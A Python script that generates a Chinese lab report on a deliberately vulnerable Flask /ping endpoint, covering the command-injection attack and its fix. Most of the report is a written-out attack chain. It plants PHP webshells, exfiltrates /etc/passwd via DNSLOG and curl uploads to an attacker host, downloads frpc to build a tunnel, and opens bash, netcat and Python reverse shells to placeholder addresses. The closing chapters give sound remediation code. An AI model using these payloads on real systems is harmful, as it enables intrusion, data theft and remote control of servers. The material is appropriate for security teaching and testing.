#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""命令注入漏洞分析与修复报告（v2 — 采纳review意见）"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("命令注入漏洞分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("DNSLOG · 反弹Shell · frp内网穿透 · 一句话木马 · bash反弹"); r.font.size = Pt(14)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验日期：2026年7月"); r.font.size = Pt(12)
doc.add_page_break()

# ===== 版本说明 =====
doc.add_heading("版本管理说明", level=1)
doc.add_paragraph("本文档为初稿评审阶段版本，配套代码（app.py/app_fixed.py）仍在同步修改中。待所有review意见处理完成后，将统一提交至GitHub仓库。请勿在评审完成前将当前版本上传。")
doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
chs = ["背景：在已有系统中新增Ping功能","命令注入漏洞概述","/ping 漏洞代码分析",
    "Web验证：判断命令注入是否成功","一句话木马测试与上传",
    "DNSLOG外带数据","frp内网穿透 + NC反弹Shell（串联流程）",
    "高版本NC反弹（无-e参数）","bash反弹Shell完整实战",
    "前端页面修改说明","修复方案详解",
    "修复前后代码对比"]
for i,c in enumerate(chs,1):
    p = doc.add_paragraph(f"第{i}章  {c}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章：背景 =====
doc.add_heading("第一章  背景：在已有系统中新增Ping功能", level=1)
doc.add_paragraph("本项目为基于Flask的用户管理系统，已包含登录、注册、搜索、文件上传、个人中心、充值、商城、管理面板、动态页面加载、密码修改、SSRF URL抓取等多项功能。")
doc.add_paragraph("本次迭代新增了网络诊断功能（/ping路由），允许已登录用户通过Web界面进行网络连通性测试。出于教学演示目的，该功能代码中故意保留了命令注入漏洞，用于完整展示攻击与防御的全过程。")

doc.add_heading("1.1 三版本代码说明", level=2)
tbl(doc, [("文件名","说明","漏洞状态"),
    ("app.py","主运行版本（有漏洞）","保留全部漏洞供教学演示"),
    ("app_pre_fix.py\n （漏洞备份版）","备份的漏洞版本，与app.py内容相同","保留全部漏洞，供对照参考"),
    ("app_fixed.py","安全修复版本","实施全部修复措施")])

doc.add_paragraph("")
doc.add_paragraph("注意事项：")
doc.add_paragraph("• 本文档配套的代码仍处于评审阶段，待最终确认后统一上传仓库", style='List Bullet')
doc.add_paragraph("• app.py故意保留漏洞用于教学，生产环境请务必使用app_fixed.py", style='List Bullet')

# ===== 第二章 =====
doc.add_heading("第二章  命令注入漏洞概述", level=1)
doc.add_paragraph("命令注入（Command Injection）是OWASP Top 10中最危险的漏洞之一，CVSS 3.0评分9.8（Critical）。攻击者通过在用户输入中注入恶意命令，在服务器端以Web进程权限执行任意系统命令。")

doc.add_heading("2.1 漏洞根因", level=2)
doc.add_paragraph("命令注入的根因是应用程序将用户输入直接拼接到系统命令中执行，未做任何过滤或转义。在Python中，使用 subprocess.check_output(cmd, shell=True) 且通过字符串拼接构建命令时，攻击者可注入管道符执行额外命令。")

doc.add_heading("2.2 命令注入符号速查表", level=2)
tbl(doc, [("符号","含义","示例","效果"),
    (";","命令分隔符","ping 8.8.8.8; whoami","先ping再执行whoami"),
    ("|","管道符","ping 8.8.8.8|whoami","将ping输出管道给whoami"),
    ("&&","与运算","ping 8.8.8.8&&whoami","ping成功后才执行whoami"),
    ("||","或运算","ping x.x.x.x||whoami","ping失败才执行whoami"),
    ("`","反引号","ping `whoami`","先执行whoami再ping"),
    ("$()","命令替换","ping $(whoami)","先执行whoami再ping")])

# ===== 第三章 =====
doc.add_heading("第三章  /ping 漏洞代码分析", level=1)
doc.add_heading("3.1 漏洞代码", level=2)
code(doc,
    'import subprocess\n\n'
    '@app.route("/ping", methods=["GET", "POST"])\n'
    'def ping():\n'
    '    ip_input = request.form.get("ip", "")\n'
    '    # ⚠️ f-string字符串拼接\n'
    '    cmd = f"ping -c 3 {ip_input}"\n'
    '    output = subprocess.check_output(cmd, shell=True,\n'
    '        timeout=30, stderr=subprocess.STDOUT)')

doc.add_heading("3.2 漏洞点列表", level=2)
tbl(doc, [("编号","漏洞","严重度","说明"),
    ("C-01","字符串拼接","🔴高危","f\"ping -c 3 {ip}\" 可注入;|&"),
    ("C-02","shell=True","🔴高危","启用shell解析，管道符被解释执行"),
    ("C-03","无输入过滤","🔴高危","IP参数可包含任意字符"),
    ("C-04","超时30秒","🟡中危","足够执行下载/反弹Shell等操作")])

# ===== 第四章：Web验证（重点修改）=====
doc.add_heading("第四章  Web验证：判断命令注入是否成功", level=1)

doc.add_heading("4.1 操作步骤", level=2)
doc.add_paragraph("在浏览器中按以下步骤验证命令注入是否存在：")
doc.add_paragraph("")
doc.add_paragraph("Step 1：登录系统 → 进入 Ping 测试页面（/ping）")
doc.add_paragraph("")
doc.add_paragraph("Step 2：输入正常IP，测试Ping功能是否正常")
code(doc,
    "输入: 8.8.8.8\n"
    "预期: 返回64 bytes from 8.8.8.8 ...（Ping正常结果）")

doc.add_paragraph("Step 3：输入带注入命令的payload")
code(doc,
    "输入: 8.8.8.8; whoami\n"
    "预期: 在Ping结果下方会出现 whoami 的输出\n"
    "      （如 root，说明命令注入成功）")

doc.add_paragraph("Step 4：观察返回结果判断注入状态")

tbl(doc, [("返回现象","判断","结论"),
    ("Ping结果 + whoami输出同时出现","注入成功 ✅","可执行任意命令"),
    ("只显示Ping结果，无whoami输出","可能被过滤","需尝试其他符号;|`$()"),
    ("返回空白或500错误","命令执行失败","检查输入是否合法"),
    ("返回'输入包含非法字符'","存在WAF防护","需尝试绕过WAF"),
    ("请求超时（30秒以上）","网络阻塞","可能是ping不通或命令卡住")])

doc.add_heading("4.2 验证不同的注入符号", level=2)
doc.add_paragraph("如果 ; 被过滤，尝试其他符号：")
code(doc,
    "# 管道符\n"
    "8.8.8.8 | whoami\n\n"
    "# 反引号\n"
    "8.8.8.8 `whoami`\n\n"
    "# 命令替换\n"
    "8.8.8.8 $(whoami)")

# ===== 第五章：一句话木马（独立章节）=====
doc.add_heading("第五章  一句话木马测试与上传", level=1)

doc.add_heading("5.1 一句话木马原理", level=2)
doc.add_paragraph("一句话木马（WebShell）是一段极短的恶意代码，攻击者将其写入服务器文件，通过HTTP请求参数控制服务器执行任意命令。")

doc.add_heading("5.2 通过命令注入写入木马", level=2)
code(doc,
    "# 写入PHP一句话木马到上传目录\n"
    "ip=8.8.8.8; echo '<?php @eval($_POST[\"cmd\"]); ?>' > static/uploads/shell.php\n\n"
    "# 写入ASP一句话木马\n"
    "ip=8.8.8.8; echo '<% response.write(\"hello\") %>' > static/uploads/shell.asp\n\n"
    "# 写入Python一句话\n"
    "ip=8.8.8.8; echo 'import os;os.system(\"whoami\")' > static/uploads/shell.py")

doc.add_heading("5.3 验证木马上传成功", level=2)
code(doc,
    "# 方式1：通过curl验证\n"
    "curl http://127.0.0.1:5000/static/uploads/shell.php\n\n"
    "# 方式2：通过SSRF的/fetch-url验证（需登录）\n"
    "POST /fetch-url\n"
    "url=http://127.0.0.1:5000/static/uploads/shell.php\n\n"
    "# 方式3：通过路径穿越验证\n"
    "GET /page?name=../static/uploads/shell.php")

doc.add_heading("5.4 连接一句话木马", level=2)
doc.add_paragraph("上传成功后，可使用以下工具连接WebShell：")
tbl(doc, [("工具","功能","连接地址"),
    ("蚁剑（AntSword）","图形化WebShell管理","http://目标/shell.php 密码:cmd"),
    ("冰蝎（Behinder）","加密流量WebShell","http://目标/shell.php 密钥:xxx"),
    ("curl命令行","快速命令执行","curl -X POST -d 'cmd=system(\"id\");' http://目标/shell.php")])

# ===== 第六章 =====
doc.add_heading("第六章  DNSLOG外带数据", level=1)
doc.add_heading("6.1 DNSLOG原理", level=2)
doc.add_paragraph("DNSLOG是一种无法直接出HTTP流量时的数据外带技术。攻击者将数据编码到DNS请求域名中，DNSLOG平台记录解析日志，攻击者通过查看日志获取数据。")
doc.add_paragraph("常用DNSLOG平台：ceye.io、dnslog.cn、burpcollaborator.net")

doc.add_heading("6.2 利用命令注入触发DNSLOG", level=2)
code(doc,
    "# 假设已在 ceye.io 注册，获得域名: abc123.ceye.io\n\n"
    "# Step1: 验证DNSLOG平台连通性\n"
    "ip=8.8.8.8; ping -c 1 `whoami`.abc123.ceye.io\n\n"
    "# 在ceye.io后台查看DNS解析记录\n"
    "# 如果看到 root.abc123.ceye.io 说明DNSLOG可用\n\n"
    "# Step2: 外带文件内容（base64编码到域名中）\n"
    "ip=8.8.8.8; curl http://`cat /etc/passwd | base64 -w0`.abc123.ceye.io\n\n"
    "# Step3: curl -F 外带数据库文件\n"
    "ip=8.8.8.8; curl -F \"file=@/etc/passwd\" http://攻击者IP:8080/upload\n\n"
    "# Kali端接收（启动nc监听）\n"
    "nc -lvnp 8080\n"
    "# 收到: POST /upload ... Content-Type: multipart/form-data ...")

# ===== 第七章（整合frp+NC串联）=====
doc.add_heading("第七章  frp内网穿透 + NC反弹Shell（串联流程）", level=1)

doc.add_heading("7.1 场景说明", level=2)
doc.add_paragraph("内网服务器的Shell无法直接反弹到公网Kali（无公网IP或防火墙限制）。frp作为隧道工具解决此问题——通过在公网VPS部署frps服务端，内网受害机运行frpc客户端建立隧道，Kali通过frps的转发端口获得稳定的NC反向连接。")

doc.add_heading("7.2 完整串联流程", level=2)
code(doc,
    "┌──────────┐    隧道     ┌──────────┐    NC连接   ┌──────────┐\n"
    "│ 受害机   │◄─frpc─frps─►│ 公网VPS  │◄────nc────►│  Kali    │\n"
    "│ (内网)   │  隧道建立    │ (frps)   │  反弹shell  │ (攻击者)  │\n"
    "└──────────┘             └──────────┘             └──────────┘\n\n"
    "攻击链路：命令注入→下载frpc→建立隧道→Kali监听→获得Shell")

doc.add_heading("7.3 Kali端（公网VPS）配置", level=2)
code(doc,
    "# 假设公网VPS的IP为 1.2.3.4\n\n"
    "# frps.ini（服务端配置）\n"
    "[common]\n"
    "bind_port = 7000\n\n"
    "# 启动frps\n"
    "./frps -c frps.ini &\n\n"
    "# Kali本地监听NC，等待反弹Shell\n"
    "nc -lvnp 4444\n\n"
    "# 连接流程:\n"
    "# 受害机→frpc→连接1.2.3.4:7000→frps建立隧道→\n"
    "# Kali的nc连接127.0.0.1:4444→隧道转发→\n"
    "# 受害机将bash反弹到127.0.0.1:4444→\n"
    "# Kali收到来自受害机的Shell")

doc.add_heading("7.4 受害机（通过命令注入）执行", level=2)
code(doc,
    "# ⚠️ 以下所有命令通过POST /ping的ip参数注入执行\n"
    "# 假设Kali的公网IP为 1.2.3.4，frps运行在 0.0.0.0:7000\n\n"
    "# Step1: 下载frpc到/tmp目录\n"
    "ip=8.8.8.8; wget http://1.2.3.4:8080/frpc_linux_amd64 -O /tmp/frpc\n"
    "ip=8.8.8.8; chmod +x /tmp/frpc\n\n"
    "# Step2: 写入frpc配置（用echo逐行写入）\n"
    "ip=8.8.8.8; echo '[common]' > /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'server_addr = 1.2.3.4' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'server_port = 7000' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo '[shell]' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'type = tcp' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'local_ip = 127.0.0.1' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'local_port = 4444' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'remote_port = 4444' >> /tmp/frpc.ini\n\n"
    "# Step3: 后台启动frpc隧道\n"
    "ip=8.8.8.8; nohup /tmp/frpc -c /tmp/frpc.ini > /tmp/frpc.log 2>&1 &\n\n"
    "# Step4: 反弹Shell（通过frp隧道转发到Kali）\n"
    "ip=8.8.8.8; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n\n"
    "# Kali端看到连接后即可执行命令\n"
    "# whoami → root  (确认获得Shell)")

# ===== 第八章 =====
doc.add_heading("第八章  高版本NC反弹（无-e参数）", level=1)
doc.add_paragraph("新版Netcat（nmap-ncat）不带 -e 参数，以下为替代方案：")

doc.add_heading("8.1 方法1：bash + NC（mkfifo）", level=2)
code(doc,
    "ip=8.8.8.8; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 攻击者IP 4444 >/tmp/f")

doc.add_heading("8.2 方法2：mknod + NC", level=2)
code(doc,
    "ip=8.8.8.8; mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc 攻击者IP 4444 1>/tmp/backpipe")

doc.add_heading("8.3 方法3：Python一行反弹", level=2)
code(doc,
    "ip=8.8.8.8; python3 -c 'import socket,subprocess;\\\n"
    "s=socket.socket();s.connect((\"攻击者IP\",4444));\\\n"
    "subprocess.call([\"/bin/bash\",\"-i\"],stdin=s.fileno(),\\\n"
    "stdout=s.fileno(),stderr=s.fileno())'")

# ===== 第九章 =====
doc.add_heading("第九章  bash反弹Shell完整实战", level=1)
doc.add_heading("9.1 标准bash反弹", level=2)
code(doc,
    "# Kali监听\n"
    "nc -lvnp 4444\n\n"
    "# 受害机执行\n"
    "ip=8.8.8.8; bash -i >& /dev/tcp/攻击者IP/4444 0>&1\n\n"
    "# 符号含义\n"
    "# bash -i              → 交互式bash\n"
    "# >& /dev/tcp/IP/PORT → stdout+stderr重定向到TCP\n"
    "# 0>&1                → stdin重定向到stdout")

doc.add_heading("9.2 完整攻击链（含具体IP示例）", level=2)
doc.add_paragraph("假设场景：Kali公网IP为1.2.3.4，受害机为内网192.168.1.100")
code(doc,
    "# Step1: 发现并验证命令注入\n"
    "ip=8.8.8.8; whoami\n"
    "# 返回: root ← 确认注入成功，当前为root权限\n\n"
    "# Step2: 写入一句话木马\n"
    r"ip=8.8.8.8; echo '<?php @eval($_POST[\"cmd\"]); ?>' > static/uploads/s.php\n\n"
    "# Step3: 启动frp隧道\n"
    "ip=8.8.8.8; wget http://1.2.3.4:8080/frpc -O /tmp/frpc\n"
    "ip=8.8.8.8; chmod +x /tmp/frpc\n"
    "ip=8.8.8.8; echo '[common]' > /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'server_addr = 1.2.3.4' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'server_port = 7000' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo '[shell]' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'type = tcp' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'local_ip = 127.0.0.1' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'local_port = 4444' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; echo 'remote_port = 4444' >> /tmp/frpc.ini\n"
    "ip=8.8.8.8; nohup /tmp/frpc -c /tmp/frpc.ini > /tmp/f.log 2>&1 &\n\n"
    "# Step4: bash反弹Shell到Kali\n"
    "ip=8.8.8.8; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")

# ===== 第十章：前端页面修改说明（新增）=====
doc.add_heading("第十章  前端页面修改说明", level=1)
doc.add_paragraph("本次新增Ping功能涉及以下前端页面的修改：")

doc.add_heading("10.1 新增 templates/ping.html", level=2)
doc.add_paragraph("新增独立的Ping测试页面，继承base.html，包含：")
doc.add_paragraph("• IP地址输入框（带占位提示）", style='List Bullet')
doc.add_paragraph('• "Ping" 按钮', style='List Bullet')
doc.add_paragraph("• 黑色背景+绿色文字的控制台风格输出区域（pre标签）", style='List Bullet')
doc.add_paragraph("• 显示实际执行的命令（cm字段）", style='List Bullet')

doc.add_heading("10.2 修改 templates/base.html", level=2)
doc.add_paragraph("在导航栏已登录状态菜单中添加入口：")
code(doc,
    '<a href="/ping" class="nav-link">Ping</a>\n'
    '← 放在"商城"和"帮助"之间', green=True)

doc.add_heading("10.3 修改 templates/index.html", level=2)
doc.add_paragraph("在首页按钮工具栏中添加Ping快捷入口：")
code(doc,
    '<a href="/ping" class="btn">🖥️ Ping</a>\n'
    '← 放在"商城"和"帮助"按钮之间', green=True)

# ===== 第十一章：修复方案 =====
doc.add_heading("第十一章  修复方案详解", level=1)

doc.add_heading("11.1 修复1：禁止shell=True", level=2)
code(doc,
    '# ✅ 参数列表形式，无shell解析\n'
    'subprocess.check_output(["ping", "-c", "3", ip_input], timeout=30)',
    green=True)

doc.add_heading("11.2 修复2：IP地址白名单+范围校验", level=2)
code(doc,
    'import re\n'
    'IP_PATTERN = r"^(?:\\d{1,3}\\.){3}\\d{1,3}$"\n'
    'if not re.match(IP_PATTERN, ip_input):\n'
    '    return "IP地址格式不合法"\n'
    'for p in ip_input.split("."):\n'
    '    if not (0 <= int(p) <= 255):\n'
    '        return "IP段超出范围"',
    green=True)

doc.add_heading("11.3 修复3：输入长度限制", level=2)
code(doc,
    '# ✅ IP地址最多15字符（如 255.255.255.255），拒绝超长payload\n'
    'if len(ip_input) > 15:\n'
    '    return "输入超出长度限制"',
    green=True)

doc.add_heading("11.4 修复4：命令注入字符过滤", level=2)
code(doc,
    'dangerous = [";", "|", "&", "`", "$", "(", ")"]\n'
    'for c in dangerous:\n'
    '    if c in ip_input:\n'
    '        return "输入包含非法字符"',
    green=True)

doc.add_heading("11.5 修复5：审计日志", level=2)
code(doc,
    '# ✅ 记录所有Ping请求\n'
    'audit_logger.info(f"Ping请求: ip={ip_input} 用户={session[\'username\']}")\n\n'
    '# 日志示例（upload_audit.log）：\n'
    '# 2026-07-16 10:00:00 Ping请求: ip=8.8.8.8; whoami 用户=alice\n'
    '# 2026-07-16 10:01:00 Ping请求: ip=8.8.8.8 用户=admin',
    green=True)

doc.add_heading("11.6 完整修复代码", level=2)
code(doc,
    'import re, subprocess\n\n'
    'IP_PATTERN = r"^(?:\\d{1,3}\\.){3}\\d{1,3}$"\n\n'
    '@app.route("/ping", methods=["GET", "POST"])\n'
    'def ping():\n'
    '    ip_input = request.form.get("ip", "")\n\n'
    '    # ✅ 长度限制\n'
    '    if len(ip_input) > 15:\n'
    '        return "输入超出长度限制"\n'
    '    # ✅ IP格式白名单\n'
    '    if not re.match(IP_PATTERN, ip_input):\n'
    '        return "IP格式不合法"\n'
    '    for p in ip_input.split("."):\n'
    '        if not (0 <= int(p) <= 255):\n'
    '            return "IP段超出范围"\n\n'
    '    # ✅ 参数列表形式\n'
    '    audit_logger.info(f"Ping: ip={ip_input}")\n'
    '    output = subprocess.check_output(\n'
    '        ["ping", "-c", "3", ip_input], timeout=30,\n'
    '        stderr=subprocess.STDOUT, universal_newlines=True)\n'
    '    return output',
    green=True)

# ===== 第十二章 =====
doc.add_heading("第十二章  修复前后代码对比", level=1)
tbl(doc, [("对比项","app.py（原始漏洞版）","app_fixed.py（修复版）"),
    ("命令构建","f\"ping -c 3 {ip}\" ⚠️拼接","[\"ping\",\"-c\",\"3\",ip] ✅参数列表"),
    ("shell参数","shell=True ⚠️开启","不传shell参数 ✅关闭"),
    ("IP正则","❌无校验","✅r\"^(?:\\d{1,3}\\.){3}\\d{1,3}$\""),
    ("范围校验","❌无校验","✅0~255校验"),
    ("长度限制","❌无限制","✅最长15字符"),
    ("危险字符","❌允许注入","✅拒绝;|&`$()"),
    ("审计日志","❌无记录","✅logging记录IP+用户")])

doc.add_paragraph("")
doc.add_paragraph("核心修复对比：")
p = doc.add_paragraph(); r = p.add_run("app.py（原始漏洞版）："); r.bold = True; r.font.color.rgb = RGBColor(0xD3,0x2F,0x2F)
code(doc,
    'cmd = f"ping -c 3 {ip_input}"          # ⚠️ 字符串拼接\n'
    'output = subprocess.check_output(cmd, shell=True)  # ⚠️ shell=True')

doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("app_fixed.py（修复版）："); r.bold = True; r.font.color.rgb = RGBColor(0x2E,0x7D,0x32)
code(doc,
    'if len(ip_input) > 15: return "超长"   # ✅ 长度限制\n'
    'if not re.match(IP_PATTERN, ip_input):  # ✅ IP白名单\n'
    '    return "格式不合法"\n'
    'output = subprocess.check_output(       # ✅ 无shell\n'
    '    ["ping", "-c", "3", ip_input])',
    green=True)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/命令注入漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ 报告已生成：{out}")
print(f"   大小：{os.path.getsize(out)/1024:.1f}KB")
